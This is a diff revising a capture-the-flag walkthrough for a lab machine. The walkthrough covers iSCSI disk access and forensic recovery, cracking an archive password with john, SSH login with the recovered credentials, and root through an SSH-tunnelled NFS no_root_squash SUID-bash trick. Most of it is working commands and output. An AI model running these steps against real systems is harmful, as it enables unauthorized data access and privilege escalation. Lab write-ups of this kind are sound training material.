@@ -14,9 +14,9 @@ An open iSCSI target is discovered and mounted directly as a local block device.
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn shadowblocks.nyx
@@ -27,7 +27,7 @@ PORT     STATE SERVICE REASON
 MAC Address: 08:00:27:F8:17:45 (Oracle VirtualBox virtual NIC)
 ```
 
-Two ports are found open: **22 (SSH)** and **3260**, the standard port for iSCSI. A version/script scan against both fills in the details:
+Two ports come back open: **22 (SSH)** and **3260**, the standard port for iSCSI. A version and script scan on both fills in the details:
 
 ```bash
 $ sudo nmap -p 22,3260 -sVC shadowblocks.nyx
@@ -43,16 +43,18 @@ MAC Address: 08:00:27:F8:17:45 (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel10
 ```
 
+The `iscsi-info` script already flags the useful part: an iSCSI target that requires no authentication.
+
 ### iSCSI Discovery and Login
 
-Rather than a typical web/SSH box, port 3260 points to an iSCSI target — a way of exposing a raw block device over the network. `iscsiadm` is used to discover what's being shared:
+Rather than a typical web/SSH box, port 3260 points to an iSCSI target — a way of exposing a raw block device over the network. `iscsiadm` discovers what's being shared:
 
 ```bash
 $ sudo iscsiadm -m discovery -t sendtargets -p shadowblocks.nyx
 shadowblocks.nyx:3260,1 iqn.2026-02.nyx.shadowblocks:storage.disk1
 ```
 
-The discovered target is logged into, which attaches it locally as if it were a physical disk:
+Logging into the discovered target attaches it locally, as if it were a physical disk:
 
 ```bash
 $ sudo iscsiadm -m node --targetname="iqn.2026-02.nyx.shadowblocks:storage.disk1" -p shadowblocks.nyx:3260 --login
@@ -89,7 +91,7 @@ Device     Boot Start    End Sectors Size Id Type
 
 ### Mounting and Imaging the Disk
 
-The new partition is mounted first to see what's on it directly:
+Mounting the new partition first shows what's on it directly:
 
 ```bash
 $ sudo mount /dev/sdb1 ~/Vulnyx/Easy/ShadowBlocks
@@ -108,11 +110,12 @@ drwx------ 2 root root    12288 Feb 28 12:49 lost+found
 -rw-rw-r-- 1 root root 20971520 Feb 28 12:49 random_fill.bin
 ```
 
-Instead of continuing through the mounted filesystem, the whole device is imaged raw, to recover anything that might have been deleted:
+The live filesystem looks unremarkable, so rather than dig through it, imaging the whole device raw preserves anything that might have been deleted:
 
 ```bash
 $ sudo umount ~/Vulnyx/Easy/ShadowBlocks
 ```
+
 ```bash
 $ sudo dd if=/dev/sdb1 of=iscsi.img bs=4M status=progress
 125829120 bytes (126 MB, 120 MiB) copied, 1 s, 119 MB/s
@@ -134,11 +137,12 @@ https://www.cgsecurity.org
 
 ### Loot: A Password-Protected 7z Archive
 
-Among the recovered files is a password-protected archive. Its hash is extracted and cracked:
+Among the recovered files is a password-protected archive. `7z2john` extracts its hash and `john` cracks it:
 
 ```bash
 $ 7z2john recup_dir.1/f0018434.7z > file_1.hash
 ```
+
 ```bash
 $ john file_1.hash /usr/share/wordlists/rockyou.txt
 Almost done: Processing the remaining buffered candidate passwords, if any.
@@ -155,6 +159,7 @@ Session completed.
 ```bash
 $ 7z e recup_dir.1/f0018434.7z
 ```
+
 ```bash
 $ ls -l
 total 25
@@ -166,6 +171,7 @@ drwxr-xr-x  2 root root 4096 Jun 30 11:17 recup_dir.1
 drwxr-xr-x 10 root root 1024 Feb 28 12:52 ShadowBlocks
 drwxrwxr-x  2 kali kali 4096 Jun 30 11:04 War
 ```
+
 ```bash
 $ cat credentials.txt
 ShadowBlocks Internal Access Credentials
@@ -189,7 +195,7 @@ Last reviewed: 2026-02-15
 
 ### Shell as lenam
 
-The credentials are validated against SSH:
+`hydra` validates the credentials against SSH:
 
 ```bash
 $ hydra -l lenam -p '3vEbN3bM6NhOa1640weG' ssh://shadowblocks.nyx
@@ -210,15 +216,6 @@ They check out, and a connection follows:
 ```bash
 $ ssh lenam@shadowblocks.nyx
 lenam@shadowblocks.nyx's password:
-Linux shadowblocks 6.12.73+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.73-1 (2026-02-17) x8
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sun Mar  1 17:17:49 2026 from 192.168.1.5
 lenam@shadowblocks:~$ id
 uid=1000(lenam) gid=1000(lenam) groups=1000(lenam),24(cdrom),25(floppy),29(audio),30(dip),44(v)
 lenam@shadowblocks:~$ ls -l /home/lenam/
@@ -227,6 +224,7 @@ total 4
 lenam@shadowblocks:~$ cat user.txt
 c94a424cb23a6b53b235511a01a9a443
 ```
+
 > **User flag:** `c94a424cb23a6b53b235511a01a9a443`
 
 ## Privilege Escalation
@@ -245,27 +243,27 @@ tcp     LISTEN   0    4096                    [::]:33289
 v_str   LISTEN   0    0                       *:22
 ```
 
-An NFS service (port 2049) is listening, but only on `127.0.0.1` — reachable from the box itself, not from outside. An SSH local port forward exposes it on the attacker's own machine instead:
+An NFS service (port 2049) is listening, reachable from the box itself. An SSH local port forward exposes it on the attacker's own machine instead:
 
 ```bash
 $ ssh -L 2049:127.0.0.1:2049 lenam@shadowblocks.nyx
 ```
 
-In a separate terminal, with the tunnel open, the forwarded export is mounted locally — as root on the attacker machine, since it's the attacker's root UID that needs to reach the server through the tunnel:
+In a separate terminal, with the tunnel open, the forwarded export mounts locally — as root on the attacker machine, since it's the attacker's root UID that needs to reach the server through the tunnel:
 
 ```bash
 $ mkdir -p ~/Vulnyx/Easy/nfs
 $ sudo mount -t nfs -o vers=4 127.0.0.1:/ ~/Vulnyx/Easy/nfs
 ```
 
-If the NFS export is configured with `no_root_squash`, the server trusts the UID a client presents — including root. Mounting it locally as root and creating a SUID-root binary there means that binary keeps root ownership and its SUID bit when the *target* box later accesses the same underlying storage:
+With the export configured `no_root_squash`, the server trusts the UID a client presents — including root. Mounting it locally as root and creating a SUID-root binary there means that binary keeps root ownership and its SUID bit when the *target* box later accesses the same underlying storage:
 
 ```bash
 $ sudo cp /bin/bash ~/Vulnyx/Easy/nfs/bashroot
 $ sudo chmod u+s ~/Vulnyx/Easy/nfs/bashroot
 ```
 
-Back on the target, the same file is now reachable through the local NFS mount path and already carries the SUID bit set from the attacker's side:
+Back on the target, the same file is reachable through the local NFS mount path and already carries the SUID bit set from the attacker's side. `bash -p` then keeps root's privileges instead of dropping them:
 
 ```bash
 lenam@shadowblocks:~$ /srv/nfs/bashroot -p
